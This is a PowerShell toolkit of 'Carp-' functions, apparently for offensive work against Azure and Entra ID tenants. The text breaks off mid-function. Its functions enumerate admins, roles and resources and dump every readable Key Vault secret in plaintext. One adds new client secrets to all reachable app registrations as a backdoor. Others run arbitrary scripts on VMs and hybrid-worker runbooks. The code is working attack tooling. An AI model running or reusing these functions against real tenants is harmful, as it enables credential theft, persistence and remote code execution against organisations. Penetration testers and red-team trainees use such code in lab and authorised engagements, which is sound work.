function print_output($command){ 
  Write-Output " "
  Write-Output " "
  print_head($command)
  Write-Output "#    $command     #"
  print_head($command)
}

function print_head($command){ 
  $str = ""
  For ($i=0; $i -le $command.length + 10; $i++) {
    $str+="#"
}
Write-Output $str
}

function Carp-ConnectWithCreds {
    param(
        [string]$TenantId = "",   # Optionally specify the Tenant ID
        [string]$Username = "",    # Optional parameter for Username
        [string]$Password = ""     # Optional parameter for Password
    )

    # Prompt for username and password if not provided
    if (-not $Username -or $Username -eq "") {
        $Username = Read-Host -Prompt "Enter your username (e.g., user@domain.com)"
    }
    
    if (-not $Password -or $Password -eq "") {
        $Password = Read-Host -Prompt "Enter your password" -AsSecureString
    }

    $securePass = ConvertTo-SecureString $Password -AsPlainText -Force

    # Create a PSCredential object from the provided username and password
    $creds = New-Object System.Management.Automation.PSCredential($Username, $securePass)

    # Check if TenantId is provided
    if ($TenantId) {
        # Connect to Azure account with the specified TenantId
        $azAccount = Connect-AzAccount -Credential $creds -TenantId $TenantId -ErrorAction SilentlyContinue
    } else {
        # Connect to Azure account without specifying TenantId (default behavior)
        $azAccount = Connect-AzAccount -Credential $creds -ErrorAction SilentlyContinue
    }

    # Check if the Azure account connection was successful
    if ($azAccount) {
        # Get the MS Graph access token
        $graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

        # Connect to Microsoft Graph using the access token
        $mgConnection = Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force) -ErrorAction SilentlyContinue
        $tenantId = (Get-AzContext).Tenant.Id


        # Check if the connection to Microsoft Graph was successful
        if ($mgConnection) {
            Write-Host "Successfully connected to Microsoft Graph."
            Get-MgUser -UserId $Username | ft
        } else {
            Write-Host "Failed to connect to Microsoft Graph."
        }
    } else {
        Write-Host "Failed to authenticate to Azure."
    }
}

function Carp-ConnectAsServicePrincipal {
<#
.SYNOPSIS
Connects to Azure using a Service Principal.

.DESCRIPTION
This function uses a Service Principal's App ID and password to authenticate against Azure. 
It creates a secure credential object and then uses `Connect-AzAccount` to log in to Azure as the Service Principal for the specified tenant.

.PARAMETER AppId
The Application (client) ID of the Service Principal.

.PARAMETER Password
The client secret (password) of the Service Principal in plain text.

.PARAMETER TenantId
The tenant ID where the Service Principal is registered.

.EXAMPLE
Carp-ConnectAsServicePrincipal -AppId 'f072c4a6-b440-40de-983f-a7f3bd317d8f' -Password 'your-secret-password' -TenantId '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
#>

    param (
        [string]$AppId,
        [string]$Password,
        [string]$TenantId,
        [Parameter(Mandatory = $false)]
        [string]$GraphToken
    )
    
    if(-not $GraphToken){
        try{
            Carp-Refresh-Connect-MgGraph
            $GraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
        } catch {
            Write-Host "Unable to get MgGraphToken"
        }
    }else{
        Connect-MgGraph -AccessToken ($GraphToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
    }

    # Convert the plain text password to a secure string
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    
    # Create a PSCredential object using the AppId and the secure password
    $Creds = New-Object System.Management.Automation.PSCredential($AppId, $SecurePassword)
    
    $TenantId = Carp-GetServicePrincipalTenantID -GraphToken $GraphToken -AppId $AppId
    # Connect to Azure using the Service Principal credentials
    Connect-AzAccount -ServicePrincipal -Credential $Creds -Tenant $TenantId
}



function Carp-Connect-Azcli {

    param (
        [Parameter(Mandatory = $true)]
        [string]$Username,

        [Parameter(Mandatory = $true)]
        [string]$Password
    )

   az login -u $Username -p $Password
}

function Carp-Refresh-Connect-MgGraph {
    
        # Get the MS Graph access token
        $graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

        # Connect to Microsoft Graph using the access token
        $mgConnection = Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force) -ErrorAction SilentlyContinue -NoWelcome

        # Check if the connection to Microsoft Graph was successful
        if ($mgConnection) {
            Write-Host "Successfully refresh connection to Microsoft Graph."
            #Get-MgUser -UserId $Username | ft
        } else {
            Write-Host "Failed to refresh connection to Microsoft Graph."
        }

}

function Carp-GetUser {
    param(
        [Parameter(Mandatory=$true)]
        [string]$userId,
        [Parameter(Mandatory=$false)]
        [string]$graphToken
    )

    if(-not $graphToken){
        try{
            Carp-Refresh-Connect-MgGraph
            $graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
        } catch {
            Write-Host "Unable to get MgGraphToken"
        }
    }else{
        Connect-MgGraph -AccessToken ($graphToken | ConvertTo-SecureString -AsPlainText -Force)
    }

    # Attempt to retrieve user by UserId (can be email or ID)
    try {
        $user = Get-MgUser -UserId $userId
        if ($user) {
            Write-Host "User found by UserId ($userId):"
            $user | Format-List *
            Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken

            return
        }
    } catch {
            try {
            #Connect-MgGraph -Scopes "User.Read"
            $user = Get-MgUser -UserId $userId 
            if ($user) {
                Write-Host "User found by UserId ($userId):"
                $user | Format-List *
                Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken

                return
            }
            } catch {
                Write-Host "User not found by UserId ($userId). Trying next search..."
            }
    }

    # If not found, attempt to retrieve user by userPrincipalName (UPN)
    try {
        $user = Get-MgUser -Filter "userPrincipalName eq '$userId'"
        if ($user) {
            Write-Host "User found by userPrincipalName ($userId):"
            $user | Format-List *
            Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken
            return
        }
    } catch {
        Write-Host "User not found by userPrincipalName ($userId). Trying next search..."
    }

    # If still not found, attempt to retrieve user by Mail
    try {
        $user = Get-MgUser -Filter "Mail eq '$userId'"
        if ($user) {
            Write-Host "User found by Mail ($userId):"
            $user | Format-List *
            Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken
            return
        }
    } catch {
        Write-Host "User not found by Mail ($userId). Trying next search..."
    }

    # If still not found, attempt to retrieve login information from Azure AD
    try {
        $loginInfo = Get-AADIntLoginInformation -UserName $userId
        if ($loginInfo) {
            Write-Host "Login information found for User ($userId):"
            $loginInfo | Format-List *

            Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken
            return
        }
    } catch {
        Write-Host "User not found with login information ($userId)."
    }

    Carp-GetUserGroups -UserEmail $userId -GraphToken $graphToken
}

function Carp-GetServicePrincipal {
<#
.SYNOPSIS
Retrieves a specific Service Principal from Microsoft Graph by its Application ID.

.DESCRIPTION
This function checks if a Microsoft Graph token is provided. If not, it attempts to refresh the connection to Microsoft Graph and retrieve a new token. Once authenticated, it queries for a Service Principal using the provided Application ID.

.PARAMETER GraphToken
An optional parameter for an existing Microsoft Graph token. If not provided, the function will attempt to retrieve a new token.

.PARAMETER AppId
The Application ID of the Service Principal to retrieve.

.EXAMPLE
Carp-GetServicePrincipal -AppId "62e44426-5c46-4e3c-8a89-f461d5d586f2"

.EXAMPLE
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Carp-GetServicePrincipal -AppId "62e44426-5c46-4e3c-8a89-f461d5d586f2" -GraphToken $token
#>

    param (
        [string]$GraphToken,
        [Parameter(Mandatory=$false)]
        [string]$AppId
    )

    if (-not $GraphToken) {
        try {
            Carp-Refresh-Connect-MgGraph
            $GraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
        } catch {
            Write-Host "Unable to get MgGraphToken" -ForegroundColor Red
            return
        }
    } else {
        Connect-MgGraph -AccessToken ($GraphToken | ConvertTo-SecureString -AsPlainText -Force)
    }

    # Retrieve the Service Principal with the specified AppId
    try {
        Get-MgServicePrincipal -All | Where-Object { $_.AppId -eq $AppId } | fl
    } catch {
        Write-Host "Error retrieving the Service Principal." -ForegroundColor Red
    }
}

function Carp-GetServicePrincipalTenantID {

    param (
        [string]$GraphToken,
        [Parameter(Mandatory=$true)]
        [string]$AppId
    )

    Connect-MgGraph -AccessToken ($GraphToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

    # Retrieve the Service Principal with the specified AppId
    try {
        $sp = Get-MgServicePrincipal -All | Where-Object { $_.AppId -eq $AppId } 
        return $sp.AppOwnerOrganizationId
    } catch {
        Write-Host "Error retrieving the Service Principal." -ForegroundColor Red
    }
}

function Carp-BasicMgEnum{
    print_output("List of Globals admins")
    $RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
    $admin = (Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
    $admin.displayName, $admin.mail

    print_output("List all custom directory roles") 
    Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName

    #print_output("List enterprise applications") 
    #Get-MgServicePrincipal -All -Filter "ServicePrincipalType eq 'Application'" | Select-Object DisplayName, AppId, Id

    print_output("Enumerate dynamic groups")
    Carp-GetDynamicGroup
}

function Carp-AzEnum{
    print_output("Enumerate resources accessible")
    Get-AzResource | Select-Object Name, ResourceType, ResourceGroupName, Location
    $assignments = Get-AzRoleAssignment 

    # Process and format the output
    $assignments | ForEach-Object {
        # Extract the last two parts of the Scope
        $scopeParts = $_.Scope -split '/'
        $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

        # Create a custom object with the desired fields
        $roleDefinition = Get-AzRoleDefinition -Name $_.RoleDefinitionName
        [PSCustomObject]@{
            Scope              = $shortScope
            DisplayName        = $_.DisplayName
            ObjectType         = $_.ObjectType
            RoleName = $_.RoleDefinitionName
            RoleDescription = $roleDefinition.Description
            RoleAction = $roleDefinition.Actions
            RoleNotAction = $roleDefinition.NotActions
            RoleIsCustom = $roleDefinition.IsCustom
        }
    } | Format-List

    
    print_output("List all the VMs where the current user has at least the Reader role")
    Carp-AzVmEnum

    print_output("List web apps")
    Carp-AzWebApps

    print_output("List all App Services")
    Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

    print_output("Function App")
    Get-AzFunctionApp 

    print_output("Enumerate storage accounts")
    Carp-StorageEnum

    print_output("Enumerate keyVault")
    Carp-keyVaultEnum

    print_output("VM Extenstion")
    Carp-AzVmExtensions

    print_output("Deployment Template Enumeration")
    Carp-DeploymentTemplateEnum

    print_output("Enumerate automation accounts and workergroup")
    Get-AzAutomationAccount| select AutomationAccountName,ResourceGroupName,Location | foreach{$_; echo ""; echo "===checking Automation Hybrid Worker Group==="; Get-AzAutomationHybridWorkerGroup -AutomationAccountName $_.AutomationAccountName -ResourceGroupName $_.ResourceGroupName | fl}

    print_output("Attempting to REST Enum")
    $GraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction SilentlyContinue).Token
    $AccessToken = (Get-AzAccessToken -ErrorAction SilentlyContinue).Token
    if($GraphToken){
        print("Graph Token successfully obtained")
        Carp-RESTApiEnum -GraphToken $GraphToken
    }else{
        print("Could not obtained Graph Token")
    }

    if($AccessToken){
        print("Graph Token successfully obtained")
        Carp-RESTApiEnum -AccessToken $AccessToken
    }else{
        print("Could not obtained ARM Token")
    }

}

function Carp-AzVmEnum{
    Get-AzVM | Select-Object Name, ResourceGroupName, Location
}

function Carp-AzVmExtensions{
    $vmExtensions = (Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions")

    foreach($vmExtension in $vmExtensions){
        $vmName = (($vmExtension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/")[0]
        $vmExtensionName = $vmExtension.Name.Split("/")[-1]
        $extension = Get-AzVMExtension -ResourceGroupName $vmExtension.ResourceGroupName -VMName $vmName -Name $vmExtensionName
        $extension
    }

    if ($vmExtensions){
        print_output("VM Extenstion permission")
        Carp-AzVmExtensionsPermissionEnum
    }
}

function Carp-AzVmExtensionsPermissionEnum {
    param (
        [Parameter(Mandatory = $false)]
        [string]$AccessToken
    )

    if (-not $AccessToken){
        try{
            $AccessToken = (Get-AzAccessToken).Token
        }catch{
            Write-Host("Unable to retrieve access token")
            return
        }
        
    }
    
    #Carp-AzVmExtensionsPermissionEnum -AccessToken $accessToken

    # Get all VM extensions
    $vmExtensions = Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions"

    # Initialize an array to store results
    $results = @()

    # Loop through each extension to get its permissions
    foreach ($extension in $vmExtensions) {
        Write-Output "Fetching permissions for VM Extension: $($extension.Name)"

        # Construct the permissions API URI
        $uri = "https://management.azure.com$($extension.ResourceId)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

        try {
            # Make the REST API call
            $permissions = Invoke-RestMethod -Method GET -Uri $uri -Headers @{
                Authorization = "Bearer $AccessToken"
            }

            # Process and store the permissions
            foreach ($permission in $permissions.value) {
                $vmName = (($extension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/")[0]
                $results += [PSCustomObject]@{
                    ExtensionName   = $extension.Name
                    VMName          = $vmName
                    ResourceGroup   = $extension.ResourceGroupName
                    Actions         = $permission.actions -join ", "
                    NotActions      = $permission.notActions -join ", "
                }
            }
        } catch {
            Write-Error "Failed to fetch permissions for VM Extension: $($extension.Name). Error: $_"
        }
    }

    # Output the results
    if ($results.Count -eq 0) {
        Write-Output "No permissions found for any VM extension."
    } else {
        $results | Format-List
    }
}


function Carp-AzWebApps{
$webapps = Get-AzWebApp

    # Process and format the output
    $webapps | ForEach-Object {
        # Extract the last two parts of the Scope
        $IDParts = $_.Id -split '/'
        $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

        # Create a custom object with the desired fields
        [PSCustomObject]@{
            ID              = $shortID
            Name        = $_.Name
            Kind = $_.Kind
            State = $_.State
            Location = $_.Location
            Hostnames         = $_.Hostnames
            Type         = $_.Type
        }
    } | Format-Table -AutoSize
}

function Carp-AzCliEnum{
    print_output("Connected user")
    az ad signed-in-user show

    print_output("List VM")
    az vm list --query '[].{name: name, location: location, licenseType: licenseType, resourceGroup: resourceGroup, osType: storageProfile.osDisk.osType, adminUsername: osProfile.adminUsername, adminPassword: osProfile.adminPassword}' -o json

    print_output("List App Services")
    az webapp list --query '[].{name: name, location: location, resourceGroup: resourceGroup, defaultHostName: defaultHostName, state: state, linuxFxVersion: siteConfig.linuxFxVersion, enabled: enabled, hostNameSslStates: hostNameSslStates[].name}' -o json

    print_output("Function Services")
    az functionapp list --query "[].{name: name, location: location, resourceGroup: resourceGroup, defaultHostName: defaultHostName, state: state, linuxFxVersion: siteConfig.linuxFxVersion, enabled: enabled, hostNameSslStates: hostNameSslStates[].name}" -o json

    print_output("Storage List")
    az storage account list --query "[].{name: name, location: location, resourceGroup: resourceGroup, sku: sku.name, kind: kind, primaryEndpoints: primaryEndpoints.blob}" -o json

    print_output("KeyVault List")
    az keyvault list --query "[].{name: name, location: location, resourceGroup: resourceGroup, tags: tags}" -o json

    print_output("List automation accounts")
    az extension add --upgrade -n automation
    az automation account list

    print_output("check objects owned by signed in user")
    az ad signed-in-user list-owned-objects --query "[].{DisplayName: displayName, ObjectID: id, Description: description}" --output table

    print_output("Request Graph API token and connect")
    $GraphToken = az account get-access-token --resource-type ms-graph --query "accessToken" -o tsv
    Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

    print_output("Request Access token and connect with AzConnect")
    $AccessToken =  az account get-access-token --resource-type ARM --query "accessToken" -o tsv
    $GraphToken = az account get-access-token --resource-type ms-graph --query "accessToken" -o tsv
    $keyvaulttoken = az account get-access-token --resource https://vault.azure.net --query "accessToken" -o tsv
    $AccountId = az ad signed-in-user show --query "id" -o tsv

    Connect-AzAccount -AccountId $AccountId -AccessToken $AccessToken -GraphAccessToken $GraphToken -KeyVaultAccessToken $keyvaulttoken

}

function Carp-keyVaultEnum{
    # list the readable keyvaults for the current user

    $keyvault = Get-AzKeyVault

    # Process and format the output
    $keyvault | ForEach-Object {
        # Extract the last two parts of the Scope
        $IDParts = $_.ResourceId -split '/'
        $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

        # Create a custom object with the desired fields
        [PSCustomObject]@{
            ID          = $shortID
            Name        = $_.VaultName
            ResourceGroupName = $_.ResourceGroupName
            Location = $_.Location
            Tags        = $_.Tags
        }
    } | Format-Table -AutoSize

    Carp-DisclosekeyVaultSecret
}

function Carp-DisclosekeyVaultSecret{
   # Get all Key Vaults in the subscription
$kvToken = (Get-AzAccessToken -ResourceTypeName KeyVault).Token

$keyVaults = Get-AzKeyVault

# Iterate over each Key Vault and get its secrets
foreach ($vault in $keyVaults) {
    Write-Host "Key Vault: $($vault.VaultName)"
    Write-Host "===================================="
    
    # Get secrets for the current Key Vault
    $secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName
    foreach ($secret in $secrets) {
        # Retrieve the secret value as plain text
        $plainTextSecret = (Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name –AsPlainText)

        Write-Host "Secret Name: $($secret.Name)"
        Write-Host "Secret Version: $($secret.Version)"
        Write-Host "Secret Value: $plainTextSecret"
        Write-Host "-----------------------------"
    }
    Write-Host "`n"
}
}

function Carp-StorageEnum{
    # Get all storage accounts in the subscription
    $storageAccounts = Get-AzStorageAccount

    # Iterate through each storage account
    foreach ($storageAccount in $storageAccounts) {
        Write-Host "Storage Account Name: $($storageAccount.StorageAccountName)"
        Write-Host "Resource Group: $($storageAccount.ResourceGroupName)"
        Write-Host "Location: $($storageAccount.Location)"
        Write-Host "------------------------------------"

        # Get the storage account context
        $context = New-AzStorageContext -StorageAccountName $storageAccount.StorageAccountName

        # List all containers in the storage account
        $containers = Get-AzStorageContainer -Context $context
        foreach ($container in $containers) {
            Write-Host "  Container Name: $($container.Name)"
            Write-Host "  Public Access Level: $($container.PublicAccess)"
            Write-Host "  ---------------------------"

            # List all blobs in the container
            $blobs = Get-AzStorageBlob -Container $container.Name -Context $context
            foreach ($blob in $blobs) {
                Write-Host "    Blob Name: $($blob.Name) : $($blob.ContentType)"
            }
        }
    }
}

function Carp-DeploymentTemplateEnum{
    # Define the directory to save deployment templates
$savePath = "C:\windows\Temp\deployments"
if (-not (Test-Path -Path $savePath)) {
    New-Item -ItemType Directory -Path $savePath | Out-Null
}

# Get all resource groups
$resourceGroups = Get-AzResourceGroup

# Iterate over resource groups to find deployments
foreach ($resourceGroup in $resourceGroups) {
    Write-Host "Resource Group: $($resourceGroup.ResourceGroupName)"
    
    # Get all deployments in the resource group
    $deployments = Get-AzResourceGroupDeployment -ResourceGroupName $resourceGroup.ResourceGroupName

    foreach ($deployment in $deployments) {
        Write-Host "Deployment Name: $($deployment.DeploymentName)"
        Write-Host "Provisioning State: $($deployment.ProvisioningState)"
        Write-Host "Template URI: $($deployment.Properties.TemplateLink.Uri)"
        $deployment

        # Save the deployment template locally
        $templateFilePath = Join-Path -Path $savePath -ChildPath "$($deployment.DeploymentName).json"
        try {
            Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $resourceGroup.ResourceGroupName -DeploymentName $deployment.DeploymentName -Path $templateFilePath -Force -ErrorAction Stop
            Write-Host "Template saved at: $templateFilePath"

            # Load the saved template and check for CommandToExecute
            $templateContent = Get-Content -Path $templateFilePath | ConvertFrom-Json
            $resources = $templateContent | Select-Object -ExpandProperty Resources
            foreach ($resource in $resources) {
                if ($resource.resources.properties.Settings -and $resource.resources.Properties.Settings.CommandToExecute) {
                    Write-Host "CommandToExecute found in resource: $($resource.Name)"
                    Write-Host "Command: $($resource.resources.Properties.Settings.CommandToExecute)"
                    Write-Host "------------------------------------"
                }
            }
        } catch {
            Write-Host "Error saving or processing template for deployment: $($deployment.DeploymentName)"
            Write-Host "Error: $_"
            Write-Host "------------------------------------"
        }
    }
}

}


function Carp-StorageSaveBlob {
    param (
        [string]$containerName,
        [string]$storageName
    )

    # Example usage:
    # Carp-StorageSaveBlob -containerName "secrets" -storageName "defcorpcodebackup"

    # Create the directory if it doesn't exist
    $destinationPath = "C:\Windows\temp\storage\"
    if (!(Test-Path -Path $destinationPath)) {
        New-Item -ItemType Directory -Path $destinationPath -Force
    }

    # Create a storage context
    $context = New-AzStorageContext -StorageAccountName $storageName

    # List all blobs in the container
    $blobs = Get-AzStorageBlob -Container $containerName -Context $context

    if ($blobs.Count -eq 0) {
        Write-Host "No blobs found in the container: $containerName"
        return
    }

    # Get the first blob
    $blob = $blobs[0]

    # Define the destination file path
    $destination = Join-Path -Path $destinationPath -ChildPath $blob.Name

    # Download the blob
    Get-AzStorageBlobContent -Blob $blob.Name `
                             -Container $containerName `
                             -Destination $destination `
                             -Context $context `
                             -Force

    Write-Host "Blob '$($blob.Name)' downloaded to '$destination'"
}


Function Add-AzADAppSecret
{

<#
    .SYNOPSIS
        Add client secret to the applications.

    .PARAMETER GraphTokenAdd-AzADAppSecret
        Pass the Graph API Token 

    .EXAMPLE
        PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

    .LINK
        https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
        https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

    [CmdletBinding()]
    param(
    [Parameter(Mandatory=$True)]
    [String]
    $GraphToken = $null
    )

    $AppList = $null
    $AppPassword = $null

    # List All the Applications


    $Params = @{
     "URI"     = "https://graph.microsoft.com/v1.0/applications"
     "Method"  = "GET"
     "Headers" = @{
     "Content-Type"  = "application/json"
     "Authorization" = "Bearer $GraphToken"
     }
    }

    try
    { 
        $AppList = Invoke-RestMethod @Params -UseBasicParsing
    }
    catch
    {
    }

    # Add Password in the Application

    if($AppList -ne $null)
    {
        [System.Collections.ArrayList]$Details = @()

        foreach($App in $AppList.value)
        {
            $ID = $App.ID
            $psobj = New-Object PSObject

            $Params = @{
             "URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
             "Method"  = "POST"
             "Headers" = @{
             "Content-Type"  = "application/json"
             "Authorization" = "Bearer $GraphToken"
             }
            }

            $Body = @{
              "passwordCredential"= @{
                "displayName" = "Password"
              }
            }
 
            try
            {
                $AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
                Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
                Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
                Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
                Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
                Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
                $Details.Add($psobj) | Out-Null
            }
            catch
            {
                Write-Output "Failed to add new client secret to '$($App.displayName)' Application." 
            }
        }
        if($Details -ne $null)
        {
            Write-Output ""
            Write-Output "Client secret added to : " 
            Write-Output $Details | fl *
        }
    }
    else
    {
       Write-Output "Failed to Enumerate the Applications."
    }
}

function rest-AzResourceEnum{
    param (
        [Parameter(Mandatory = $true)]
        [string]$AccessToken
    )

    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
        'Authorization' = "Bearer $AccessToken"
        }
    }
    $subscriptionID = ((Invoke-RestMethod @RequestParams).value).ID

    $URI = ("https://management.azure.com"+$subscriptionID+"/resources?api-version=2020-10-01")
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
        'Authorization' = "Bearer $AccessToken"
        }
    }
    $all_res = (Invoke-RestMethod @RequestParams).value 

    $all_res

    # Check allowed actions

    $all_res | ForEach-Object {
        # Construct the URI for the Azure REST API request
        $URI = "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

        # Define the request parameters
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
                'Authorization' = "Bearer $AccessToken"
            }
        }

        # Output the resource ID
        Write-Output "Resource ID: $($_.id)"

        try {
            # Invoke the REST API and fetch the response
            $response = Invoke-RestMethod @RequestParams -ErrorAction Stop

            # Process the response to check for 'actions' and 'notActions'
            if ($response.value -and $response.value.Count -gt 0) {
                $response.value | ForEach-Object {
                    if ($_.actions -and $_.actions.Count -gt 0) {
                        Write-Output "=== Actions ==="
                        $response.value.actions
                    }

                    
                }
            } else {
                Write-Output "No permissions data found."
            }
        } catch {
            Write-Warning "Failed to retrieve permissions for resource ID $($_.id). Error: $_"
        }

        Write-Output ""
    }
}

function rest-AzEnterpriseAppEnum{
    param (
        [Parameter(Mandatory = $true)]
        [string]$GraphToken
    )

    $URI = 'https://graph.microsoft.com/v1.0/applications'
    $RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $GraphToken"
        }
    }
    (Invoke-RestMethod @RequestParams).value | select displayName,id,publisherDomain

    # List roles assigned to the enterprise applications 

    (Invoke-RestMethod @RequestParams).value | foreach{
    $MYURI = ("https://graph.microsoft.com/v1.0/servicePrincipals/"+$_.appId+"/appRoleAssignments")
    $RequestPar = @{
        Method = 'GET'
        Uri = $MYURI
        Headers = @{
        'Authorization' = "Bearer $GraphToken"
        }
    }
        try {
        (Invoke-RestMethod @RequestPar -ErrorAction SilentlyContinue).value 
        } catch {
            Write-Warning "Failed to retrieve permissions for resource ID $($_.appId). Error: $_"
        }

    }
}

function Carp-RESTApiEnum{
    param (
        [Parameter(Mandatory = $false)]
        [string]$AccessToken,

        [Parameter(Mandatory = $false)]
        [string]$GraphToken
    )

    if($AccessToken){
        print_output("List all resources accessible")
        rest-AzResourceEnum -AccessToken $AccessToken

        print_output("VM Extenstion permission")
        Carp-AzVmExtensionsPermissionEnum
    }

    if($GraphToken){
        print_output("Check app where secret can be added by using")
        Add-AzADAppSecret -GraphToken $GraphToken -ErrorAction SilentlyContinue

        print_output("Enterprise App permission")
        rest-AzEnterpriseAppEnum -GraphToken $GraphToken 

        print_output("List proxy App")
        Get-MgApplicationProxyApplication  -GraphToken $GraphToken
    }

    if($AccessToken -and $GraphToken){

    }
    
}

function Carp-CreateAndRunRunbook {
    param (
        [Parameter(Mandatory = $true)]
        [string]$RunbookName,

        [Parameter(Mandatory = $true)]
        [string]$RunbookPath,

        [Parameter(Mandatory = $true)]
        [string]$RunOn
    )

    try {

        # Get Worker
        $Worker = Get-AzAutomationAccount  | foreach{ Get-AzAutomationHybridWorkerGroup -AutomationAccountName $_.AutomationAccountName -ResourceGroupName $_.ResourceGroupName | Where-Object { $_.Name -eq $workerGroupName }}
        $AutomationAccountName = $Worker.AutomationAccountName
        $ResourceGroupName = $Worker.ResourceGroupName
        
        # Import the runbook
        Write-Output "Importing runbook '$RunbookName' from path '$RunbookPath'..."
        Import-AzAutomationRunbook -Name $RunbookName -Path $RunbookPath `
                                   -AutomationAccountName $AutomationAccountName `
                                   -ResourceGroupName $ResourceGroupName `
                                   -Type PowerShell -Force -Verbose

        # Publish the runbook
        Write-Output "Publishing runbook '$RunbookName'..."
        Publish-AzAutomationRunbook -RunbookName $RunbookName `
                                    -AutomationAccountName $AutomationAccountName `
                                    -ResourceGroupName $ResourceGroupName -Verbose

        # Start the runbook
        Write-Output "Starting runbook '$RunbookName' on '$RunOn'..."
        Start-AzAutomationRunbook -RunbookName $RunbookName `
                                  -RunOn $RunOn `
                                  -AutomationAccountName $AutomationAccountName `
                                  -ResourceGroupName $ResourceGroupName -Verbose

        Write-Output "Runbook '$RunbookName' started successfully."

    } catch {
        Write-Error "An error occurred while processing the runbook: $_"
    }
}

function Carp-RunCommandOnVm {
    param (
        [Parameter(Mandatory = $true)]
        [string]$VmName,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $true)]
        [string]$ScriptPath
    )

    try {
        # Get the VM object based on whether ResourceGroupName is provided
        if ($ResourceGroupName) {
            Write-Output "Retrieving VM '$VmName' from resource group '$ResourceGroupName'..."
            $vm = Get-AzVM -Name $VmName -ResourceGroupName $ResourceGroupName
        } else {
            Write-Output "ResourceGroupName not provided. Retrieving VM '$VmName'..."
            $vm = Get-AzVM | Where-Object { $_.Name -eq $VmName }
            if ($vm -eq $null) {
                throw "VM '$VmName' not found."
            }
            $ResourceGroupName = $vm.ResourceGroupName
            Write-Output "Located ResourceGroupName: '$ResourceGroupName'"
        }

        # Get the network profile to find the public IP address
        Write-Output "Retrieving network profile for VM '$VmName'..."
        $networkprofile = $vm.NetworkProfile.NetworkInterfaces.Id.Split('/')[-1]
        $networkipname = (Get-AzNetworkInterface -Name $networkprofile -ResourceGroupName $ResourceGroupName).IpConfigurations.PublicIpAddress.Id.Split('/')[-1]
        $publicipaddress = (Get-AzPublicIpAddress -Name $networkipname -ResourceGroupName $ResourceGroupName).IpAddress

        Write-Output "Public IP address of VM '$VmName': $publicipaddress"

        # Run the specified PowerShell script on the VM
        Write-Output "Running script '$ScriptPath' on VM '$VmName'..."
        Invoke-AzVMRunCommand -VMName $vm.Name `
                              -ResourceGroupName $vm.ResourceGroupName `
                              -CommandId 'RunPowerShellScript' `
                              -ScriptPath $ScriptPath -Verbose

        Write-Output "Command executed successfully on VM '$VmName'."

    } catch {
        Write-Error "An error occurred while executing the command on VM '$VmName': $_"
    }
}

function Carp-ConnectVm {
    param (
        [Parameter(Mandatory = $true)]
        [string]$VmName,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $true)]
        [string]$Username,

        [Parameter(Mandatory = $true)]
        [string]$Password
    )

    # Retrieve the VM details
    if ($ResourceGroupName) {
        $vm = Get-AzVM -Name $VmName -ResourceGroupName $ResourceGroupName
    } else {
        $vm = Get-AzVM -Name $VmName
    }

    # Extract the network profile
    $networkProfile = (Get-AzVM -Name $vm.Name -ResourceGroupName $vm.ResourceGroupName).NetworkProfile.NetworkInterfaces.Id.Split('/')[-1]
    $networkIpName = (Get-AzNetworkInterface -Name $networkProfile).IpConfigurations.PublicIpAddress.Id.Split('/')[-1]
